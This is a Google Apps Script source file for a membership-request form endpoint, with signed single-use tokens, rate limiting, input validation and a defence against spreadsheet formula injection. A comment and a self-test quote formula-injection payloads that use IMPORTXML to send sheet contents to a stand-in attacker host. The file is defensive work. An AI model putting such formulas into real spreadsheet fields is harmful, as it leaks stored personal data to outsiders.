/* ======================================================================
   Loja Privata - request form endpoint
   ----------------------------------------------------------------------
   A Google Apps Script web app: it receives one request from the form in
   index.html and appends one row to the "Invitations" tab of this
   spreadsheet.

   Two routes, and nothing else is reachable from the internet:

     GET  ?action=token   -> a single-use submit token
     POST (JSON body)     -> validate, throttle, append one row

   There is no read route. The endpoint can only ever add a row; it cannot
   list, search or return anything already stored, so a hostile caller has
   no way to pull the membership list back out.

   This script is CONTAINER-BOUND: create it from the spreadsheet itself
   (Extensions > Apps Script). That is what keeps the only OAuth scope it
   ever needs down to `spreadsheets.currentonly` - it can touch this one
   spreadsheet and nothing else in the account's Drive. There is
   deliberately no sheet id in the config and no `openById()` anywhere.

   Deploy: Deploy > New deployment > Web app,
           "Execute as: Me", "Who has access: Anyone".
   Both are required for a public form. "Execute as: Me" is what lets an
   anonymous visitor write to a sheet only you can open - the visitor
   never touches your Drive, this script does, on their behalf, through
   exactly the two routes below.

   Ground rule throughout: the browser is not a security boundary. Every
   check the page performs is repeated here, on values re-derived from the
   raw request body. Nothing from the client is trusted, including its
   Content-Type, its timestamps and its idea of what a field means.

   Setup, deployment and the reasoning behind each defence: README.md
   ====================================================================== */


/* ======================================================================
   1. LIMITS AND KEYS
   ====================================================================== */

var LIMITS = {
  bodyChars:      4096,   // a legitimate submit is ~250 characters
  nameMin:        2,
  nameMax:        80,
  emailMax:       254,    // RFC 5321 maximum
  tokenMinAgeMs:  1200,   // a human cannot load and submit faster than this
  tokenMaxAgeMs:  30 * 60 * 1000,
  perEmailSec:    900,    // one submit per address per 15 min
  perEmailBurst:  5,      // ...and at most 5 per 6 h
  globalPerHour:  120     // circuit breaker for the whole endpoint
};

/* ----------------------------------------------------------------------
   Signing key. Generated once, on demand, and kept in Script Properties —
   never in this file, so the source can be shared or committed safely.
   ---------------------------------------------------------------------- */
function getSigningKey_() {
  var props = PropertiesService.getScriptProperties();
  var key = props.getProperty('SIGNING_KEY');
  if (!key) {
    key = Utilities.base64Encode(
      Utilities.getUuid() + '.' + Utilities.getUuid() + '.' + Date.now()
    );
    props.setProperty('SIGNING_KEY', key);
  }
  return key;
}

function hmac_(message) {
  var raw = Utilities.computeHmacSha256Signature(message, getSigningKey_());
  return Utilities.base64EncodeWebSafe(raw).replace(/=+$/, '');
}

/* Constant-time compare: a byte-by-byte `===` on a MAC leaks, through
   response timing, how many leading bytes of a guess were correct. */
function safeEquals_(a, b) {
  var x = String(a), y = String(b);
  if (x.length !== y.length) return false;
  var diff = 0;
  for (var i = 0; i < x.length; i++) diff |= x.charCodeAt(i) ^ y.charCodeAt(i);
  return diff === 0;
}

function sha256Hex_(message) {
  var bytes = Utilities.computeDigest(
    Utilities.DigestAlgorithm.SHA_256, message, Utilities.Charset.UTF_8
  );
  return bytes.map(function (b) {
    return ('0' + (b & 0xff).toString(16)).slice(-2);
  }).join('');
}

/* ======================================================================
   2. TOKENS AND RATE LIMITING
   ====================================================================== */

/* ----------------------------------------------------------------------
   Single-use submit tokens.

   Apps Script cannot read request headers, so an Origin or Referer check
   is not available and a classic CSRF token has nothing to bind to. What
   this does buy:

     - a submit must be preceded by a GET from a real page load
     - each token dies on first use (CacheService), so a captured request
       cannot be replayed
     - the min/max age window rejects both instant-fire bots and stale
       tokens scraped hours earlier

   It is a speed bump for automation, not authentication. The endpoint is
   public by design: treat every row in the sheet as unverified until a
   human confirms it.
   ---------------------------------------------------------------------- */
function issueToken() {
  var payload = Date.now() + '.' + Utilities.getUuid();
  return payload + '.' + hmac_(payload);
}

function consumeToken_(token) {
  if (typeof token !== 'string' || token.length > 200) return false;

  var parts = token.split('.');
  if (parts.length !== 3) return false;

  var issuedAt = parts[0], nonce = parts[1], mac = parts[2];
  if (!/^\d{13}$/.test(issuedAt) || !/^[0-9a-fA-F-]{36}$/.test(nonce)) return false;
  if (!safeEquals_(mac, hmac_(issuedAt + '.' + nonce))) return false;

  var age = Date.now() - Number(issuedAt);
  if (age < LIMITS.tokenMinAgeMs || age > LIMITS.tokenMaxAgeMs) return false;

  // Burn it. The cache entry outlives the token's own max age, so a
  // replay always lands on a key that is still present.
  var cache = CacheService.getScriptCache();
  var key = 'tok:' + nonce;
  if (cache.get(key)) return false;
  cache.put(key, '1', Math.ceil(LIMITS.tokenMaxAgeMs / 1000) + 60);

  return true;
}

/* ----------------------------------------------------------------------
   Rate limiting. Apps Script exposes no client IP, so the throttle keys
   off the submitted address (hashed - the cache is not the place for
   personal data) plus a global counter that caps total damage.

   Returns 'ok', 'repeat' (this address submitted recently or too often)
   or 'global' (the whole endpoint is over its hourly ceiling). Code.gs
   answers 'repeat' with a normal success page: telling a caller "that
   address already applied" turns the form into an address-checking
   oracle, and a member who submits twice should not see an error.
   ---------------------------------------------------------------------- */
function rateLimitCheck_(email) {
  var cache = CacheService.getScriptCache();
  var id = sha256Hex_(email.toLowerCase()).slice(0, 32);

  if (cache.get('cool:' + id)) return 'repeat';

  var burstKey = 'burst:' + id;
  var burst = Number(cache.get(burstKey) || 0);
  if (burst >= LIMITS.perEmailBurst) return 'repeat';

  var hourKey = 'global:' + Math.floor(Date.now() / 3600000);
  var hits = Number(cache.get(hourKey) || 0);
  if (hits >= LIMITS.globalPerHour) return 'global';

  cache.put('cool:' + id, '1', LIMITS.perEmailSec);
  cache.put(burstKey, String(burst + 1), 21600);   // 6 h, the cache maximum
  cache.put(hourKey, String(hits + 1), 3600);
  return 'ok';
}

/* ======================================================================
   3. INPUT VALIDATION
   ====================================================================== */

/* ----------------------------------------------------------------------
   Normalisation + validation
   ---------------------------------------------------------------------- */

/* Strips the characters that make a value dangerous or unreadable rather
   than merely wrong: C0/C1 controls, bidi overrides (used to make a name
   render as something other than what is stored), zero-width marks, and
   runs of whitespace. NFC first, so visually identical strings compare
   and de-duplicate as equal. */
function clean_(value) {
  if (typeof value !== 'string') return '';
  return value
    .normalize('NFC')
    .replace(/[\u0000-\u001F\u007F-\u009F]/g, ' ')          // controls
    .replace(/[\u200B-\u200F\u202A-\u202E\u2066-\u2069\uFEFF]/g, '') // zero-width + bidi
    .replace(/\s+/g, ' ')
    .trim();
}

/* Letters (any script, so diacritics and non-Latin names are fine),
   spaces, and the punctuation that occurs in real names. No digits, no
   symbols, nothing that could open a formula or a URL. */
var NAME_RE = /^[\p{L}\p{M}][\p{L}\p{M} '’.\-]*$/u;

/* Deliberately stricter than the RFC: one @, a dotted domain, a
   2+ letter TLD, no quoting, no comments, no display name. */
var EMAIL_RE = /^[A-Za-z0-9!#$%&'*+/=?^_`{|}~.\-]{1,64}@[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?(?:\.[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?)*\.[A-Za-z]{2,63}$/;

function validateName_(raw) {
  var v = clean_(raw);
  if (v.length < LIMITS.nameMin || v.length > LIMITS.nameMax) return null;
  if (!NAME_RE.test(v)) return null;
  return v;
}

function validateEmail_(raw) {
  var v = clean_(raw).toLowerCase().replace(/\s/g, '');
  if (v.length < 6 || v.length > LIMITS.emailMax) return null;
  if (!EMAIL_RE.test(v)) return null;
  if (v.indexOf('..') !== -1) return null;
  if (v.charAt(0) === '.' || v.indexOf('.@') !== -1) return null;
  return v;
}

/* Returns { ok: true, record } or { ok: false, error }.
   `body` is the already-JSON-parsed request. */
function validateSubmission_(body) {
  if (!body || typeof body !== 'object' || Array.isArray(body)) {
    return { ok: false, error: 'invalid' };
  }

  /* Honeypot. A bot fills every field it finds; the page hides this one
     from people. Silence is the response - an error message only tells
     the bot what to change. Code.gs turns this into a fake success. */
  if (clean_(body.company) !== '') return { ok: false, error: 'honeypot' };

  var fullName  = validateName_(body.fullName);
  var signature = validateName_(body.signature);
  var email     = validateEmail_(body.email);

  if (!fullName)  return { ok: false, error: 'invalid_name' };
  if (!email)     return { ok: false, error: 'invalid_email' };
  if (!signature) return { ok: false, error: 'invalid_signature' };

  var now = new Date();
  var tz  = Session.getScriptTimeZone();

  return {
    ok: true,
    record: {
      receivedAt: Utilities.formatDate(now, tz, "yyyy-MM-dd'T'HH:mm:ssXXX"),
      fullName:   fullName,
      email:      email,
      signature:  signature,
      signedOn:   Utilities.formatDate(now, tz, 'yyyy-MM-dd'),
      requestId:  Utilities.getUuid(),
      source:     body.source === 'modal' ? 'modal' : 'page'
    }
  };
}

/* ======================================================================
   4. THE SHEET
   ====================================================================== */

/* The tab the requests land in. Looked up by name, not by position, so
   dragging the tabs around in the UI can never silently redirect
   submissions into the wrong sheet. Created as the first tab if it is not
   there yet, so a brand-new spreadsheet works with no manual setup.

   Rename it here and in the spreadsheet together, or the next submit will
   quietly start a fresh, empty tab under the old name. */
var SHEET_NAME = 'Invitations';

function getInboxSheet_() {
  var file = SpreadsheetApp.getActive();
  return file.getSheetByName(SHEET_NAME) || file.insertSheet(SHEET_NAME, 0);
}

var COLUMNS = [
  'Received At',    // server clock, ISO 8601 — never trust a client timestamp
  'Full Name',
  'Email',
  'Signature',
  'Signed On',      // the date the signature block showed the visitor
  'Request ID',
  'Source',         // 'page' | 'modal' — which copy of the form
  'Status'          // workflow column for whoever reviews the requests
];

/* Idempotent: safe to call on every submit, cheap after the first run. */
function ensureHeader_(sheet) {
  if (sheet.getLastRow() > 0) return;

  sheet.getRange(1, 1, 1, COLUMNS.length)
       .setValues([COLUMNS])
       .setFontWeight('bold');
  sheet.setFrozenRows(1);

  // Widen the columns people actually read.
  sheet.setColumnWidth(1, 170);
  sheet.setColumnWidth(2, 200);
  sheet.setColumnWidth(3, 240);
  sheet.setColumnWidth(4, 200);
}

/* ----------------------------------------------------------------------
   Formula / CSV injection defence.

   A cell whose value starts with = + - @ (or a tab/CR, which some clients
   normalise into those) is executed as a formula by Sheets and by Excel
   when the sheet is exported to CSV. A field like

       =IMPORTXML("https://attacker.example/?d="&A2, "//x")

   would quietly exfiltrate every row of this sheet to whoever typed it.

   A single leading apostrophe is Sheets' own "this is literal text"
   marker: it is stored, not displayed, and getValue() gives back the
   original string. So every user-supplied cell gets one. Nothing here
   is ever evaluated.
   ---------------------------------------------------------------------- */
function asLiteralText_(value) {
  var s = String(value == null ? '' : value);
  return "'" + s;
}

/* Appends one submission. Caller has already validated and normalised
   `record`; this function only serialises it.

   getLastRow()+1 under a script lock rather than appendRow() — appendRow
   re-parses its arguments as if they were typed into the cell, which is
   exactly the parsing we are trying to avoid. */
function writeRow(record) {
  var lock = LockService.getScriptLock();
  // Concurrent submits would otherwise race for the same row index.
  if (!lock.tryLock(20000)) throw new Error('busy');

  try {
    var sheet = getInboxSheet_();
    ensureHeader_(sheet);

    var row = [
      asLiteralText_(record.receivedAt),
      asLiteralText_(record.fullName),
      asLiteralText_(record.email),
      asLiteralText_(record.signature),
      asLiteralText_(record.signedOn),
      asLiteralText_(record.requestId),
      asLiteralText_(record.source),
      asLiteralText_('Nou')
    ];

    sheet.getRange(sheet.getLastRow() + 1, 1, 1, row.length).setValues([row]);
    SpreadsheetApp.flush();
  } finally {
    lock.releaseLock();
  }
}

/* ======================================================================
   5. WEB APP ENTRY POINTS
   ====================================================================== */

/* Responses are deliberately terse and identical in shape. They carry a
   short machine code, never a message built from user input, never a
   stack trace, and never a hint about what the server holds. */
function respond_(payload) {
  return ContentService
    .createTextOutput(JSON.stringify(payload))
    .setMimeType(ContentService.MimeType.JSON);
}

function doGet(e) {
  var action = e && e.parameter ? e.parameter.action : '';
  if (action === 'token') {
    return respond_({ ok: true, token: issueToken() });
  }
  return respond_({ ok: false, error: 'not_found' });
}

function doPost(e) {
  try {
    /* The request never gets to touch the parser until its size is
       known-small. A legitimate submit is ~250 characters; the ceiling
       is there so a multi-megabyte body cannot burn the quota. */
    if (!e || !e.postData || typeof e.postData.contents !== 'string') {
      return respond_({ ok: false, error: 'invalid' });
    }
    if (e.postData.contents.length > LIMITS.bodyChars) {
      return respond_({ ok: false, error: 'invalid' });
    }

    var body;
    try {
      body = JSON.parse(e.postData.contents);
    } catch (parseError) {
      return respond_({ ok: false, error: 'invalid' });
    }

    var checked = validateSubmission_(body);

    /* A bot that filled the hidden field gets the same success envelope
       a person gets. Nothing is written. */
    if (!checked.ok && checked.error === 'honeypot') {
      return respond_({ ok: true });
    }
    if (!checked.ok) {
      return respond_({ ok: false, error: checked.error });
    }

    if (!consumeToken_(body.token)) {
      return respond_({ ok: false, error: 'token' });
    }

    var limit = rateLimitCheck_(checked.record.email);
    if (limit === 'repeat') return respond_({ ok: true });
    if (limit !== 'ok')     return respond_({ ok: false, error: 'busy' });

    writeRow(checked.record);
    return respond_({ ok: true });

  } catch (err) {
    /* Logged for the owner (Executions in the Apps Script console),
       never returned - an exception message can name internal state. */
    console.error('doPost failed: ' + (err && err.stack ? err.stack : err));
    return respond_({ ok: false, error: 'server' });
  }
}

/* ----------------------------------------------------------------------
   Run once from the editor, before the first deployment: it creates the
   signing key and the header row, and makes the OAuth consent prompt
   happen here rather than on a visitor's first submit.
   ---------------------------------------------------------------------- */
function setup() {
  var sheet = getInboxSheet_();
  getSigningKey_();
  ensureHeader_(sheet);
  console.log('Ready. Writing to the "' + sheet.getName() + '" tab.');
}

/* Editor-only smoke test. Writes one row with obviously fake data,
   including the payloads that a formula-injection attempt would use -
   open the sheet afterwards and confirm they sit there as inert text. */
function selfTest() {
  var probes = [
    '=IMPORTXML("https://example.invalid/?x="&A2,"//a")',
    '+1+1',
    '@SUM(A1:A9)',
    '-1-1'
  ];

  probes.forEach(function (probe) {
    var checked = validateSubmission_({
      fullName: probe, email: 'probe@example.com', signature: probe
    });
    if (checked.ok) throw new Error('validation let a formula through: ' + probe);
  });

  writeRow({
    receivedAt: new Date().toISOString(),
    fullName:   'Test Ionescu',
    email:      'test@example.com',
    signature:  'Test Ionescu',
    signedOn:   '2026-01-01',
    requestId:  Utilities.getUuid(),
    source:     'selftest'
  });

  console.log('selfTest passed - delete the test row from the sheet.');
}
